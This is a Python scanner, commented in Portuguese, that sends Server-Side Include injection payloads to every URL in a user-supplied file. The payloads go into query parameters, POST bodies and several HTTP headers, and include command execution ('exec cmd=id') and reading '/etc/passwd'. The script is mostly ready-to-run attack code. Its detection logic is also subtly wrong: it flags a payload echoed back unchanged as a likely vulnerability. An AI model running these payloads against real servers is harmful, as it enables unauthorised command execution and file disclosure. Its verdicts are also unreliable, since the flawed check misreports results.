import requests
import re

# Payloads básicos para exploração de SSI
ssi_payloads = [
    "<!--#echo var=\"DOCUMENT_ROOT\" -->",         # Tenta injetar variáveis do servidor
    "<!--#exec cmd=\"id\" -->",                    # Tenta executar comando no servidor
    "<!--#include file=\"/etc/passwd\" -->",       # Tenta acessar um arquivo do sistema
    "<!--#include virtual=\"/index.html\" -->"     # Tenta incluir um arquivo do site
]

# Cabeçalhos de segurança esperados e headers vulneráveis a injeção SSI
headers_vulneraveis = ["User-Agent", "Referer", "X-Forwarded-For"]

# Função para testar SSI em parâmetros de URL
def test_ssi_in_params(url):
    results = []
    for payload in ssi_payloads:
        try:
            response = requests.get(f"{url}?test={payload}", timeout=5)
            if payload in response.text:
                results.append(f"[+] Possível SSI detectado em parâmetro URL: {url}?test={payload}")
            else:
                print(f"[-] Nenhuma vulnerabilidade detectada com payload: {payload}")
        except requests.RequestException as e:
            print(f"[!] Erro ao testar payload {payload}: {e}")
    return results

# Função para testar SSI injetado no corpo da requisição
def test_ssi_in_body(url):
    results = []
    for payload in ssi_payloads:
        try:
            response = requests.post(url, data={"test": payload}, timeout=5)
            if payload in response.text:
                results.append(f"[+] Possível SSI detectado no corpo da requisição: {url} com payload {payload}")
            else:
                print(f"[-] Nenhuma vulnerabilidade detectada com payload: {payload}")
        except requests.RequestException as e:
            print(f"[!] Erro ao testar payload {payload}: {e}")
    return results

# Função para testar SSI em headers HTTP
def test_ssi_in_headers(url):
    results = []
    for payload in ssi_payloads:
        headers = {header: payload for header in headers_vulneraveis}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            for header in headers_vulneraveis:
                if payload in response.text:
                    results.append(f"[+] Possível SSI detectado no header {header}: {url} com payload {payload}")
                    break
            else:
                print(f"[-] Nenhuma vulnerabilidade detectada com payload em headers: {payload}")
        except requests.RequestException as e:
            print(f"[!] Erro ao testar SSI em headers com payload {payload}: {e}")
    return results

# Função principal para ler URLs do arquivo e testar SSI
def main(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()
    except FileNotFoundError:
        print(f"[Erro] Arquivo não encontrado: {file_path}. Verifique o caminho e tente novamente.")
        return

    print(f"Iniciando teste de vulnerabilidade SSI nas URLs do arquivo: {file_path}\n")
    all_vulnerabilities = []

    for url in urls:
        print(f"\nTestando URL: {url}")
        results_params = test_ssi_in_params(url)
        results_body = test_ssi_in_body(url)
        results_headers = test_ssi_in_headers(url)
        all_vulnerabilities.extend(results_params + results_body + results_headers)

    # Relatório final de vulnerabilidades
    print("\n[Relatório de Vulnerabilidades SSI Encontradas]")
    for vuln in all_vulnerabilities:
        print(vuln)

if __name__ == "__main__":
    file_path = input("URLs File: ")
    main(file_path)
